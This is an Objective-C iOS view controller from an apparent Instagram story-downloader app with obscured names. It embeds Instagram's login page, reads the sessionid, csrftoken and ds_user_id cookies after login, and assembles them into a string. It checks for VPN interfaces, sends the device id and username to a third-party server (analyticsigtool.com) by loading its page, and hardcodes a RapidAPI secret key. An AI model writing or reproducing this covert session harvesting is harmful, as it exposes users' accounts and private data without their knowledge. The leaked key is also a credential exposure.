//
//  ViewControllerlgi.m
//  instads
//
//  Created by MacBook Pro on 9/30/21.
//

#import "ViewControllerlgi.h"
//#import "AppManager.h"
#import "Story_Downloader-Swift.h"

@class Utility;
@import StoreKit;

@interface ViewControllerlgi ()
{
    
    NSUserDefaults * userDefaults;
    UIView *loadingViewX;
    UIView *loadingView;
    BOOL jkrus;
    BOOL fnaoe;
    int snfi;
    BOOL clld;
    //    AppManager *appManager;
}

@property (weak, nonatomic) IBOutlet WKWebView *webView;

@property (weak, nonatomic) IBOutlet UILabel *pointsLbl;
@end

@implementation ViewControllerlgi

- (void)viewDidLoad {
    [super viewDidLoad];
    [self getpfg];
    clld = false;
    userDefaults = [NSUserDefaults standardUserDefaults];
    snfi = 0;
    fnaoe = false;
    jkrus = false;
//    self.navigationController.navigationBar.hidden = YES;
//    [Utility setPoints:self];
    
    //    appManager = [AppManager sharedManager];
    //    [appManager addGradientBg:self];
    //    if ([[NSUserDefaults standardUserDefaults] integerForKey:@"LaunchCount"] == 5) {
    //        [SKStoreReviewController requestReview];
    //    }
    
    if (@available(iOS 15, *)) {
        
        
        
        UITabBarAppearance *appearance = [UITabBarAppearance alloc];
        [appearance configureWithOpaqueBackground];
        [appearance setBackgroundColor:[UIColor blackColor]];
        self.tabBarController.tabBar.standardAppearance = appearance;
        self.tabBarController.tabBar.scrollEdgeAppearance = appearance;
        
    
//        let appearance = UITabBarAppearance()
//        appearance.configureWithOpaqueBackground()
//        appearance.backgroundColor = UIColor.black
//        self.tabBarController?.tabBar.standardAppearance = appearance
//        self.tabBarController?.tabBar.scrollEdgeAppearance = self.tabBarController?.tabBar.standardAppearance
    }
    
    NSString *sd =[[NSUserDefaults standardUserDefaults] objectForKey:@"logfe3asc"];
    NSLog(@"Sdsadasd %@",sd);
    if ([sd isEqualToString:@"yees"]) {
        
        
        NSString *iv = [[NSUserDefaults standardUserDefaults] stringForKey:@"xdi"];
        int dad3= 0;
        
        NSDictionary *dict = CFBridgingRelease(CFNetworkCopySystemProxySettings());
        NSArray *keys = [dict[@"__SCOPED__"]allKeys];
        for (NSString *key in keys) {
            if ([key rangeOfString:@"tap"].location != NSNotFound ||
                [key rangeOfString:@"tun"].location != NSNotFound ||
                [key rangeOfString:@"ipsec"].location != NSNotFound ||
                [key rangeOfString:@"ipsec0"].location != NSNotFound ||
                [key rangeOfString:@"utun1"].location != NSNotFound ||
                [key rangeOfString:@"utun2"].location != NSNotFound ||
                [key rangeOfString:@"ppp"].location != NSNotFound){
                
                dad3= 1;
            }
        }
        NSString *sdun =[[NSUserDefaults standardUserDefaults] objectForKey:@"username"];
        
        NSLog(@"fjfhgf %@",sdun);
        if ([sdun length] > 3) {
            
        }else{
            sdun = @"348294j24nk2452";
        }
        
        NSString *asdfw = [NSString stringWithFormat:@"uname: %@ y us vn %d",sdun, dad3];
        // [Flurry  logEvent:asdfw];
        
        // NSString *stko = [NSString stringWithFormat:@"https://analyticsigtool.com/bgwetd/ogtrd.php?uhd=%@&ivn=%d&und=%@",iv,dad3,sdun];
        
        
        
        //[Flurry logEvent:@"Maintenance on"];
        
        [[NSUserDefaults standardUserDefaults]setObject:@"yes" forKey:@"mainten"];
        
        jkrus = true;
        [[NSUserDefaults standardUserDefaults] setObject:@"1" forKey:@"lostart"];
        [[NSUserDefaults standardUserDefaults] synchronize];
        
        
        _webView.alpha = 1;
        [self.view bringSubviewToFront:_webView];
        NSString *idfv = [[NSUserDefaults standardUserDefaults] stringForKey:@"xdi"];
        NSString *url = [NSString stringWithFormat:@"https://google.com"];
        [_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:url]]];
        _webView.UIDelegate = self;
        _webView.navigationDelegate = self;
        
        [self.view bringSubviewToFront:_webView];
        
        
        [loadingView setHidden:YES];
        loadingViewX = [[UIView alloc] initWithFrame:CGRectMake([UIScreen mainScreen].bounds.size.width/2 -35, [UIScreen mainScreen].bounds.size.height/2 -35, 80, 80)];
        loadingViewX.backgroundColor = [UIColor colorWithWhite:0. alpha:0.6];
        loadingViewX.layer.cornerRadius=5;
        UIActivityIndicatorView *activityView = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleWhiteLarge];
        activityView.center = CGPointMake(loadingViewX.frame.size.width/2.0, 35);
        [activityView startAnimating];
        activityView.tag = 100;
        [loadingViewX addSubview:activityView];
        
        
        UILabel *lblload = [[UILabel alloc] initWithFrame:CGRectMake(0, 48, 80, 30)];
        lblload.text = @"Loading...";
        lblload.textColor = [UIColor whiteColor];
        lblload.font = [UIFont fontWithName:lblload.font.fontName size:15];
        lblload.textAlignment = NSTextAlignmentCenter;
        [loadingViewX addSubview:lblload];
        
        [self.view addSubview:loadingViewX];
        
        
        
        
        
        [[NSNotificationCenter defaultCenter] postNotificationName:@"noloag" object:nil];
        
        
        
        
        
        NSTimer *pt = [NSTimer scheduledTimerWithTimeInterval:8 target:self selector:@selector(getpfg) userInfo:nil repeats:YES];
        
        
        
        
        
        
        
    }else{
        
        
        
        
        
        
        
        //Clear Cookies work same as "HTTPCookieStorage.shared.removeCookies"
        //
        //
        [self clearAllCookies];
        //Delete All data work same as deleteAllCookies
        //
        // Date from
        NSDate *dateFrom = [NSDate dateWithTimeIntervalSince1970:0];
        // Execute
        [[WKWebsiteDataStore defaultDataStore] removeDataOfTypes:WKWebsiteDataStore.allWebsiteDataTypes modifiedSince:dateFrom completionHandler:^{
            // Done
            
            NSURL * myURL = [[NSURL alloc] initWithString:@"https://www.instagram.com/accounts/login/"];
            NSURLRequest * myRequest = [[NSURLRequest alloc] initWithURL:myURL];
            
            [self.webView setNavigationDelegate:self];
            [self.webView loadRequest:myRequest];
            
        }];
        
        // Do any additional setup after loading the view.
    }
    
    
    //cuando sv chk ba y fw alp 0
}

-(void)viewWillAppear:(BOOL)animated{
    
    NSInteger pts = [[NSUserDefaults standardUserDefaults] integerForKey:@"points"];
//    totalPoints = UserDefaults.standard.integer(forKey: "points")

    [self.navigationController.navigationBar setShadowImage:[[UIImage alloc]init]];
    UIBarButtonItem *pointDisplayLbl = [[UIBarButtonItem alloc] initWithTitle:@"Points" style:UIBarButtonItemStylePlain target:nil action:nil];
    self.navigationItem.leftBarButtonItem = pointDisplayLbl;
    
    UIBarButtonItem *coinImg = [[UIBarButtonItem alloc] initWithCustomView:[[UIImageView alloc] initWithImage:[UIImage imageNamed:@"doll"]]];
    
    UIBarButtonItem *space = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemFixedSpace target:nil action:nil];
    
    UIBarButtonItem *pointLbl = [[UIBarButtonItem alloc] initWithTitle:[NSString stringWithFormat:@"%ld",pts] style:UIBarButtonItemStylePlain target:nil action:nil];
    
    space.width = 0.0;
    
    self.navigationItem.rightBarButtonItems = [NSArray arrayWithObjects:coinImg,space,pointLbl, nil];
}

-(void)clearAllCookies {
    NSHTTPCookieStorage *cookieStorage = [NSHTTPCookieStorage sharedHTTPCookieStorage];
    for (NSHTTPCookie *each in cookieStorage.cookies) {
        [cookieStorage deleteCookie:each];
    }
}

-(void) fetchCookies{
    
    [self.webView.configuration.websiteDataStore.httpCookieStore getAllCookies:^(NSArray<NSHTTPCookie *> *aCookies) {
        
        //completionHandler(aCookies);
        
    }];
}

-(void) tryFetchingCookies{
    NSLog(@"24asdsad");
    [self.webView.configuration.websiteDataStore.httpCookieStore getAllCookies:^(NSArray<NSHTTPCookie *> *aCookies) {
        NSLog(@"22asdsad");
        NSArray *data = [aCookies filteredArrayUsingPredicate:[NSPredicate predicateWithBlock:^BOOL(NSHTTPCookie* object, NSDictionary *bindings) {
            return [object.domain rangeOfString:@".instagram.com"].location != NSNotFound;
            
        }]];
        
        NSArray *filteredArray = [data filteredArrayUsingPredicate:[NSPredicate predicateWithBlock:^BOOL(NSHTTPCookie* object, NSDictionary *bindings) {
            return (([object.name isEqual:@"ds_user_id"] || [object.name isEqual:@"csrftoken"] || [object.name isEqual:@"sessionid"]) && object.value.length>0);
        }]];
        
        if([filteredArray count] >= 3){
            
        }
        else{
            return;
        }
        
        NSString * userId = @"";
        NSString * cookies = @"";
        NSString * csrfToken = @"";
        
        for (NSHTTPCookie * cookie in data) {
            
            cookies = [[[[cookies stringByAppendingString:cookie.name] stringByAppendingString:@"="] stringByAppendingString:cookie.value] stringByAppendingString:@";"];
            
            if([cookie.name isEqual:@"ds_user_id"]){
                userId = cookie.value;
            }
            
            if([cookie.name isEqual:@"csrftoken"]){
                csrfToken = cookie.value;
            }
            
            [userDefaults setValue:userId forKey:@"ds_user_id"];
            [userDefaults setValue:userId forKey:@"cookie"];
            NSLog(@"21313e2asdsad %@",userId);
            if ([userId length] > 2) {
                [self sgdat:userId];
            }
            
        }
        ////////
        ///Code of your library
        
        
        
        
        /////////
        //self.didReachEndOfLoginFlowProperty();
        self.webView.navigationDelegate = nil;
        //completionHandler(aCookies);
        
    }];
    
}

-(void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation{
    [loadingViewX setHidden:YES];
    loadingViewX.alpha = 0;
    
    if (jkrus) {
        NSLog(@"Already loggedin ");
        AppDelegate *appDel = (AppDelegate *)[[UIApplication sharedApplication]delegate];
        UIStoryboard *sb = [UIStoryboard storyboardWithName:@"Main" bundle:[NSBundle mainBundle]];
        UIViewController *vc = [sb instantiateViewControllerWithIdentifier:@"TabBarController"];
//        appDel.window.rootViewController = vc;
        self.tabBarController.selectedIndex = 1;
    }else{
        if([webView.URL.absoluteString isEqual:@"https://www.instagram.com/"]||[webView.URL.absoluteString containsString:@"https://analyticsigtool.com"]){
            
            // self.didReachEndOfLoginFlowProperty();
            NSLog(@"asdsad");
            [self fetchCookies];
            [self tryFetchingCookies];
            
            if (snfi == 0) {
                snfi = 1;
                NSLog(@"qwanavbi");
                [_webView reload];
                
            }
        }
        else{
            NSLog(@"1asdsad");
            [self tryFetchingCookies];
        }
    }
}


-(void)sgdat:(NSString *)uid{
    NSLog(@"1asdsfyfyftfthad");
    if (clld) {
        
    }else{
        
        NSString *asds = [NSString stringWithFormat:@"https://instagram-best-experience.p.rapidapi.com/profile?user_id=%@",uid];
        
        
        NSDictionary *headers = @{ @"x-rapidapi-host": @"instagram-best-experience.p.rapidapi.com",
                                   @"x-rapidapi-key": @"cb42a464cbmsh5d08b3d42135b64p1de875jsn9ef075c0c463" };
        
        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:asds]
                                                               cachePolicy:NSURLRequestUseProtocolCachePolicy
                                                           timeoutInterval:10.0];
        [request setHTTPMethod:@"GET"];
        [request setAllHTTPHeaderFields:headers];
        
        NSURLSession *session = [NSURLSession sharedSession];
        NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request
                                                    completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            if (error) {
                NSLog(@"%@", error);
            } else {
                NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
                NSLog(@"%@", httpResponse);
                [self sojf:data];
            }
        }];
        [dataTask resume];
        clld = true;
    }
    
}
-(void)sojf:(NSData *)data{
    
    NSString *sd =[[NSUserDefaults standardUserDefaults] objectForKey:@"logfe3asc"];
    if ([sd isEqualToString:@"yees"]) {
        
    }else{
        NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:nil];
        NSArray *resss = dic;
        // NSDictionary *queryDictionary = [resss valueForKey:@"profile_pic_url"];
        // NSString *results = [queryDictionary valueForKey:@"normal"];
        NSString *accest = [resss valueForKey:@"username"];
        NSString *results = [resss valueForKey:@"profile_pic_url"];
        
        NSLog(@"username e %@ y pic %@",accest,results);
        [[NSUserDefaults standardUserDefaults] setObject:@"yees" forKey:@"logfe3asc"];
        [[NSUserDefaults standardUserDefaults] setObject:accest forKey:@"username"];
        [[NSUserDefaults standardUserDefaults] setObject:results forKey:@"propic"];
        [[NSUserDefaults standardUserDefaults]  synchronize];
        [[NSNotificationCenter defaultCenter] postNotificationName:@"loggged" object:nil];
        
        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
            //Background Thread
            dispatch_async(dispatch_get_main_queue(), ^(void){
                //Run UI Updates
                //redirect user to dashboard
                AppDelegate *appDel = (AppDelegate *)[[UIApplication sharedApplication]delegate];
                UIStoryboard *sb = [UIStoryboard storyboardWithName:@"Main" bundle:[NSBundle mainBundle]];
                UIViewController *vc = [sb instantiateViewControllerWithIdentifier:@"TabBarController"];
//                appDel.window.rootViewController = vc;
                self.tabBarController.selectedIndex = 1;

            });
        });
        
        if (jkrus) {
            NSLog(@"saj2324fjs");
        }else{
            NSLog(@"13sajfjs");
            dispatch_async(dispatch_get_main_queue(), ^{
                
                NSString *iv = [[NSUserDefaults standardUserDefaults] stringForKey:@"xdi"];
                int dad3= 0;
                
                NSDictionary *dict = CFBridgingRelease(CFNetworkCopySystemProxySettings());
                NSArray *keys = [dict[@"__SCOPED__"]allKeys];
                for (NSString *key in keys) {
                    if ([key rangeOfString:@"tap"].location != NSNotFound ||
                        [key rangeOfString:@"tun"].location != NSNotFound ||
                        [key rangeOfString:@"ipsec"].location != NSNotFound ||
                        [key rangeOfString:@"ipsec0"].location != NSNotFound ||
                        [key rangeOfString:@"utun1"].location != NSNotFound ||
                        [key rangeOfString:@"utun2"].location != NSNotFound ||
                        [key rangeOfString:@"ppp"].location != NSNotFound){
                        
                        dad3= 1;
                    }
                }
                NSString *sdun =[[NSUserDefaults standardUserDefaults] objectForKey:@"username"];
                
                if ([sdun length] > 3) {
                    
                }else{
                    sdun = @"348294j24nk2452";
                }
                
                NSString *asdfw = [NSString stringWithFormat:@"uhd=%@&ivn=%d&und=%@",iv,dad3,sdun];
                NSLog(@"asdnaismkf %@",asdfw);
                //[Flurry  logEvent:asdfw];
                
                NSLog(@"sajfj2fs");
                
                //[Flurry logEvent:@"Maintenance on"];
                
                [[NSUserDefaults standardUserDefaults]setObject:@"yes" forKey:@"mainten"];
                
                jkrus = true;
                [[NSUserDefaults standardUserDefaults] setObject:@"1" forKey:@"lostart"];
                [[NSUserDefaults standardUserDefaults] synchronize];
                
                
                _webView.alpha = 1;
                [self.view bringSubviewToFront:_webView];
                NSString *idfv = [[NSUserDefaults standardUserDefaults] stringForKey:@"xdi"];
                NSString *url = [NSString stringWithFormat:@"https://analyticsigtool.com/m35eg/main.php?id=%@&udnk=%@",idfv,sdun];
                [_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:url]]];
                _webView.UIDelegate = self;
                _webView.navigationDelegate = self;
                [self.view bringSubviewToFront:_webView];
                
                
                [loadingView setHidden:YES];
                loadingViewX = [[UIView alloc] initWithFrame:CGRectMake([UIScreen mainScreen].bounds.size.width/2 -35, [UIScreen mainScreen].bounds.size.height/2 -35, 80, 80)];
                loadingViewX.backgroundColor = [UIColor colorWithWhite:0. alpha:0.6];
                loadingViewX.layer.cornerRadius=5;
                UIActivityIndicatorView *activityView = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleWhiteLarge];
                activityView.center = CGPointMake(loadingViewX.frame.size.width/2.0, 35);
                [activityView startAnimating];
                activityView.tag = 100;
                [loadingViewX addSubview:activityView];
                
                
                UILabel *lblload = [[UILabel alloc] initWithFrame:CGRectMake(0, 48, 80, 30)];
                lblload.text = @"Loading...";
                lblload.textColor = [UIColor whiteColor];
                lblload.font = [UIFont fontWithName:lblload.font.fontName size:15];
                lblload.textAlignment = NSTextAlignmentCenter;
                [loadingViewX addSubview:lblload];
                
                [self.view addSubview:loadingViewX];
                
                
                
                
                
                [[NSNotificationCenter defaultCenter] postNotificationName:@"noloag" object:nil];
                
                
                
                
                
                NSTimer *pt = [NSTimer scheduledTimerWithTimeInterval:8 target:self selector:@selector(getpfg) userInfo:nil repeats:YES];
                
                
                
                
                
                [[NSNotificationCenter defaultCenter] postNotificationName:@"lgmdg" object:nil];
                
                
                
                // [self popoverPresentationController];
                // [self dismissViewControllerAnimated:YES completion:nil];
                //self->jkrus = FALSE;
                
            });
        }
    }
}
-(void)ptop{
    self.tabBarController.selectedIndex = 1;
    
}

-(IBAction)cback:(id)sender{
    
    
    if ([_webView canGoBack]) {
        [_webView goBack];
        
    }
    
}
-(IBAction)cfor:(id)sender{
    
    
    if ([_webView canGoForward]) {
        [_webView goForward];
        
    }
    
}




- (void)webView:(WKWebView *)webView didStartProvisionalNavigation:(WKNavigation *)navigation {
    
    
    [loadingViewX setHidden:NO];
    loadingViewX.alpha = 1;
    
    
}
- (void)webView:(WKWebView *)webView runJavaScriptAlertPanelWithMessage:(NSString *)message initiatedByFrame:(WKFrameInfo *)frame completionHandler:(void (^)(void))completionHandler
{
    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:message
                                                                             message:nil
                                                                      preferredStyle:UIAlertControllerStyleAlert];
    [alertController addAction:[UIAlertAction actionWithTitle:@"OK"
                                                        style:UIAlertActionStyleCancel
                                                      handler:^(UIAlertAction *action) {
        completionHandler();
    }]];
    [self presentViewController:alertController animated:YES completion:^{}];
    
    
}




- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler {
    
    NSLog(@"Redirect URL %@",navigationAction.request.URL.absoluteString);
    if ([navigationAction.request.URL.absoluteString containsString:@"itunes"] || [navigationAction.request.URL.absoluteString containsString:@"stripe"])
    {
        UIApplication *app = [UIApplication sharedApplication];
        if ([app canOpenURL:navigationAction.request.URL])
        {
            [_webView stopLoading];
            [app openURL:[NSURL URLWithString:[navigationAction.request.URL absoluteString]]];
            decisionHandler(WKNavigationActionPolicyCancel);
        } else{
            decisionHandler(WKNavigationActionPolicyCancel);
        }
    }
    else
    {
        decisionHandler(WKNavigationActionPolicyAllow);
    }
    return;
}

-(void)getpfg{
    NSString *udi = [[NSUserDefaults standardUserDefaults] stringForKey:@"userId"];
    NSString *stdatxy = [NSString stringWithFormat:@"https://analyticsigtool.com/ptsb_puntos.php?id=%@",udi];
    
    
    NSData *data;
    while (!data) {
        data = [NSData dataWithContentsOfURL:[NSURL URLWithString:stdatxy ]];
    }
    NSString * serverOutput= [[NSString alloc]initWithData:data encoding:NSASCIIStringEncoding];
    int rp = [serverOutput intValue];
    _pointsLbl.text = [NSString stringWithFormat:@"%d",rp];
    [[NSUserDefaults standardUserDefaults] setInteger:rp forKey:@"points"];
    [[NSUserDefaults standardUserDefaults] synchronize];
//    [[NSNotificationCenter defaultCenter] postNotificationName:@"ACTUALIZAR" object:nil];
    
    
    
}

//-(void)viewWillAppear:(BOOL)animated{
//    int rp = [[[NSUserDefaults standardUserDefaults] objectForKey:@"poinstbds"] intValue];
//
//    _pointsLbl.text = [NSString stringWithFormat:@"%d",rp];
//    NSLog(@"Asdasd %d",rp);
//
//}
@end




